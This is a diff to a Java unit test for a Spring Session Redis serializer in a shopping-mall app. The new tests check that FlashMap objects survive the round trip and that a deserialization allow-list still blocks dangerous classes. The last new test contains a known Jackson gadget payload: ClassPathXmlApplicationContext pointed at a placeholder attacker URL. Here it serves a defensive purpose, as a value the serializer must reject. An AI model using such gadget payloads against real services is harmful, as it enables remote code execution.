@@ -5,11 +5,19 @@ import org.junit.jupiter.api.DisplayName;
 import org.junit.jupiter.api.Test;
 import org.springframework.data.redis.serializer.GenericJacksonJsonRedisSerializer;
 import org.springframework.data.redis.serializer.RedisSerializer;
+import org.springframework.data.redis.serializer.SerializationException;
+import org.springframework.web.servlet.FlashMap;
 import tools.jackson.databind.ObjectMapper;
+import tools.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
 
 import java.nio.charset.StandardCharsets;
+import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
 
 import static org.assertj.core.api.Assertions.assertThat;
+import static org.assertj.core.api.Assertions.assertThatThrownBy;
 
 /**
  * 守住「会话里的对象读回来还是原来那个类型」。
@@ -82,6 +90,66 @@ class MallSessionSerializerTest {
         assertThat(restored)
                 .as("裸 ObjectMapper 居然保留了类型信息 —— 那说明上面两条测试证明不了什么，需要重新设计")
                 .isNotInstanceOf(LoginUser.class);
+    }
+
+    /**
+     * Spring MVC 的 {@code addFlashAttribute} 会把 {@code List<FlashMap>} 存进会话
+     * （SessionFlashMapManager 的 FLASH_MAPS 属性）。
+     *
+     * <p>2026-08-27 起白名单只放行 com.mall / java.*，FlashMap 不在里面：写得进去、读不回来。
+     * 2026-09-29 压测时发现的后果：<b>输错一次密码，这个会话之后每个请求都 500</b>，
+     * 直到会话过期（mall-auth 登录失败用 addFlashAttribute 回显错误）；结算页同理，
+     * 任何一次下单失败（库存不足、价格变动、连接池超时）都会让用户的会话报废。
+     * 回归脚本测了「错密码被拒绝」，但只看 Location 头，而那个 500 响应同样带着 Location。
+     */
+    @Test
+    @DisplayName("会话里的 FlashMap（登录失败 / 下单失败回显）往返之后仍是 FlashMap，内容不丢")
+    @SuppressWarnings("unchecked")
+    void flashMapsSurviveTheRoundTrip() {
+        RedisSerializer<Object> serializer = config.springSessionDefaultRedisSerializer();
+
+        Object restored = serializer.deserialize(serializer.serialize(flashMaps()));
+
+        assertThat(restored).isInstanceOf(List.class);
+        List<?> list = (List<?>) restored;
+        assertThat(list).hasSize(2).allMatch(FlashMap.class::isInstance);
+        // FlashMap 同时是 Map 和 Comparable，assertThat 重载有歧义，按 Map 断言
+        assertThat((Map<String, Object>) list.get(0)).containsEntry("errorCode", 3).containsEntry("errorMsg", "库存不足");
+        assertThat((Map<String, Object>) list.get(1)).containsEntry("errors", Map.of("loginacct", "账号或密码错误"));
+    }
+
+    @Test
+    @DisplayName("阴性对照：修复前的白名单读不回 FlashMap —— 证明上一条测得出这个 bug")
+    void previousAllowListRejectsFlashMap() {
+        RedisSerializer<Object> previous = GenericJacksonJsonRedisSerializer.builder()
+                .enableDefaultTyping(BasicPolymorphicTypeValidator.builder()
+                        .allowIfSubType("com.mall.").allowIfSubType("java.lang.")
+                        .allowIfSubType("java.util.").allowIfSubType("java.time.").build())
+                .build();
+        byte[] bytes = previous.serialize(flashMaps());
+
+        assertThatThrownBy(() -> previous.deserialize(bytes)).isInstanceOf(SerializationException.class)
+                .hasMessageContaining("org.springframework.web.servlet.FlashMap");
+    }
+
+    @Test
+    @DisplayName("放行 FlashMap 没有顺手放行整个 org.springframework：经典 gadget 类仍被拒绝")
+    void otherSpringClassesAreStillRejected() {
+        RedisSerializer<Object> serializer = config.springSessionDefaultRedisSerializer();
+        String gadget = "{\"@class\":\"org.springframework.context.support.ClassPathXmlApplicationContext\","
+                + "\"configLocation\":\"http://attacker.invalid/x.xml\"}";
+
+        assertThatThrownBy(() -> serializer.deserialize(gadget.getBytes(StandardCharsets.UTF_8)))
+                .isInstanceOf(SerializationException.class);
+    }
+
+    private static List<FlashMap> flashMaps() {
+        FlashMap order = new FlashMap();
+        order.put("errorCode", 3);
+        order.put("errorMsg", "库存不足");
+        FlashMap login = new FlashMap();
+        login.put("errors", new HashMap<>(Map.of("loginacct", "账号或密码错误")));
+        return new ArrayList<>(List.of(order, login));
     }
 
     private static LoginUser sample() {
